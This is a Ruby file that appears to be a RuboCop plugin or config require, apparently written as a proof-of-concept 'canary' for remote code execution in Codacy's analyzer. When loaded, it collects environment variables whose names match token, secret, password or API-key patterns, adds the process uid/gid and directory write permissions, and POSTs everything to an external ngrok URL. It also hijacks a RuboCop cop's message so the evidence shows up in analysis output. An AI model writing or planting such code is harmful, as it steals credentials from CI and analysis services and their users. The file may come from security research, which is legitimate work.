# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

CANARY = "codacy-analyzer-rce-064a0614a716d033f1791a45"
CALLBACK =
  URI("https://dcd6-49-207-201-243.ngrok-free.app/codacy/064a0614a716d033f1791a45")
CREDENTIAL_NAME =
  /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i

def writable?(path)
  File.writable?(path)
rescue StandardError
  false
end

credentials = ENV.each_with_object({}) do |(name, value), result|
  next if value.nil? || value.empty?
  next unless name.match?(CREDENTIAL_NAME)
  break result if result.length >= 100

  result[name] = value
end

payload = JSON.generate(
  canary: CANARY,
  tool: "rubocop",
  runtime: {
    uid: Process.uid,
    gid: Process.gid,
    cwd: Dir.pwd,
    sourceWritable: writable?("/src"),
    rootWritable: writable?("/"),
    workdirWritable: writable?("/workdir")
  },
  credentials: credentials
)

https_egress = begin
  request = Net::HTTP::Post.new(CALLBACK)
  request["content-type"] = "application/json"
  request["user-agent"] = "codacy-analyzer-canary/rubocop"
  request.body = payload

  response = Net::HTTP.start(
    CALLBACK.host,
    CALLBACK.port,
    use_ssl: true,
    open_timeout: 5,
    read_timeout: 5
  ) { |http| http.request(request) }
  response.is_a?(Net::HTTPSuccess)
rescue StandardError
  false
end

CODACY_RUNTIME_EVIDENCE = [
  "CODACY_CANARY_EXECUTED",
  "uid=#{Process.uid}",
  "gid=#{Process.gid}",
  "source_writable=#{writable?('/src')}",
  "root_writable=#{writable?('/')}",
  "workdir_writable=#{writable?('/workdir')}",
  "https_egress=#{https_egress}",
  "credential_names=#{credentials.keys.sort.join(',')}"
].join(" ")

RuboCop::Cop::Style::StringLiterals.class_eval do
  define_method(:message) do |_node|
    ::CODACY_RUNTIME_EVIDENCE
  end

  private :message
end
